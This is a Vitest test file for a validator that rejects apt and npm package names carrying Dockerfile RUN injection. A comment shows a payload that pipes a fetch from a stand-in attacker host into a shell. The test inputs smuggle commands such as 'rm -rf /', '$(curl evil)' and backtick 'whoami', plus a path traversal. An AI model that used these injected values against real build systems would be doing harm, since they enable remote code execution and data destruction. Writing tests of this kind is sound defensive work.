import { describe, expect, it } from 'vitest';

import { APT_PACKAGE_RE, NPM_PACKAGE_RE, invalidPackageName } from './package-validation.js';

describe('package-name validation (blocks Dockerfile RUN injection)', () => {
  it('accepts ordinary apt + npm names (incl. scoped npm)', () => {
    expect(invalidPackageName(['curl', 'lib-foo.bar+1'], ['lodash', '@scope/pkg.name'])).toBeNull();
  });

  it('rejects a newline-injected apt name (the M4 attack: an extra RUN layer)', () => {
    // `--apt 'curl\nRUN curl http://attacker/steal|sh'` must NOT pass — a newline in a package
    // name would inject a new Dockerfile layer executing arbitrary shell during `docker build`.
    expect(invalidPackageName(['curl\nRUN evil'], [])).toBe('apt:curl\nRUN evil');
  });

  it('rejects shell metacharacters and spaces in either ecosystem', () => {
    expect(invalidPackageName(['a b'], [])).toBe('apt:a b');
    expect(invalidPackageName([], ['pkg;rm -rf /'])).toBe('npm:pkg;rm -rf /');
    expect(invalidPackageName([], ['$(curl evil)'])).toBe('npm:$(curl evil)');
    expect(invalidPackageName(['pkg`whoami`'], [])).toBe('apt:pkg`whoami`');
  });

  it('reports the apt offender before the npm offender, null when clean', () => {
    expect(invalidPackageName(['bad name'], ['also;bad'])).toBe('apt:bad name');
    expect(invalidPackageName([], [])).toBeNull();
  });

  it('the regexes match the MCP self-mod contract exactly (no drift between paths)', () => {
    expect(APT_PACKAGE_RE.test('curl')).toBe(true);
    expect(APT_PACKAGE_RE.test('UPPER')).toBe(false); // apt names are lowercase
    expect(NPM_PACKAGE_RE.test('@scope/pkg')).toBe(true);
    expect(NPM_PACKAGE_RE.test('pkg/../../etc')).toBe(false);
  });
});
